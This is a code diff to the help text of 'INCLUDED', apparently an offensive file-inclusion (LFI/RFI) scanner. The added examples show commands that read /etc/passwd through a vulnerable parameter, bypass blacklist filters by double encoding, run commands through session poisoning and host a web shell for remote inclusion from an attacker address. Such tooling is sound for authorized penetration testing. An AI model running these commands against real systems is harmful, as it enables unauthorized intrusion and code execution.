@@ -47,8 +47,33 @@ def build_parser() -> argparse.ArgumentParser:
         formatter_class=argparse.RawDescriptionHelpFormatter,
         description="INCLUDED — modular File Inclusion (LFI/RFI) scanner. "
                     "For authorized targets only.",
-        epilog="The INCLUDE marker in the URL marks the injection point, "
-               "e.g. -w \"http://host/?page=INCLUDE\"",
+        epilog="""\
+The INCLUDE marker in the URL marks the injection point, e.g.
+  -w "http://host/?page=INCLUDE"
+
+examples:
+  # basic scan, all modules, default wordlist
+  included -w "http://host/index.php?language=INCLUDE"
+
+  # target one specific file, verbose
+  included -w "http://host/?p=INCLUDE" -f /etc/passwd -v
+
+  # RCE only, with a command; a PHPSESSID cookie also enables session poisoning
+  included -w "http://host/?p=INCLUDE" --profile rce --cmd "id" -b PHPSESSID=abc
+
+  # blacklist bypass: filter blocks literal '.' / '/' after one decode --
+  # -e double (or the default -e all) hides them behind a second encoding pass
+  included -w "http://host/contact.php?region=INCLUDE" -f /etc/passwd -e double
+
+  # noise filtering by response size, like ffuf -fs, output to JSON
+  included -w "http://host/img.php?p=INCLUDE" -fs 1234 -o out.json -of json
+
+  # external wordlist, e.g. SecLists, instead of the bundled defaults
+  included -w "http://host/?view=INCLUDE" -W /usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 1234
+
+  # RFI with an auto-hosted web shell (needs a reachable --lhost)
+  included -w "http://host/?view=INCLUDE" -m rfi --lhost 10.10.14.1 --lport 8000 --cmd id
+""",
     )
     # --- target ---
     tgt = p.add_argument_group("target")
@@ -148,7 +173,7 @@ def _curl_repro(cfg: Config, f: Finding) -> str:
     log_poison, rfi) — their payload string alone doesn't capture the
     POST body swap / injected headers / hosted shell those use.
     """
-    url, body = build_request(cfg, f.payload)
+    url, body = build_request(cfg, f.payload, encoding=f.encoding)
     parts = ["curl", "-s"]
     if cfg.method != "GET":
         parts += ["-X", cfg.method]
